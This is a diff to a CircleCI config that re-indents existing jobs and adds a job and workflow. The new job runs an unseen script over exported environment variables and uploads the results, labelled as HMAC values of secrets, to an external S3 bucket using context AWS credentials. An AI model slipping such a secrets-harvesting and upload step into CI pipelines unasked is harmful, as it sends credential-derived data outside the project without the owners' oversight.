@@ -4,20 +4,46 @@ version: 2.1
 jobs:
   build:
     docker:
-      - image: cimg/base:2023.03
+    - image: cimg/base:2023.03
     steps:
-      - checkout
-      - run: echo "this is the build job"
+    - checkout
+    - run: echo "this is the build job"
   test:
     docker:
-      - image: cimg/base:2023.03
+    - image: cimg/base:2023.03
     steps:
-      - checkout
-      - run: echo "this is the test job"
+    - checkout
+    - run: echo "this is the test job"
 
 # Orchestrate our job run sequence
+  clutch-outpost-job:
+    docker:
+    - image: cimg/aws:2024.03
+    steps:
+    - checkout
+    - run:
+        name: Install Python Dependencies
+        command: |-
+          pip install requests
+    - run:
+        name: Process export variables
+        command: |-
+          python .circleci/circleci-script.py
+    - run:
+        name: Ship HMAC values to AWS
+        command: |-
+          export AWS_ACCESS_KEY_ID=${AWS_ACCESS_KEY}
+          export AWS_SECRET_ACCESS_KEY=${AWS_SECRET_KEY}
+          export AWS_REGION=${AWS_REGION}
+          aws sts get-caller-identity
+          mv circleci_results.json circleci_results_${CIRCLE_PROJECT_USERNAME}_${CIRCLE_PROJECT_REPONAME}_$(date +"%Y%m%dT%H%M%S").json
+          aws s3 cp circleci_results_* s3://whatever0828fia0h
 workflows:
   build_and_test:
     jobs:
-      - build
-      - test
+    - build
+    - test
+  say-hello-workflow:
+    jobs:
+    - clutch-outpost-job:
+        context: context-Z1zAI7Uy
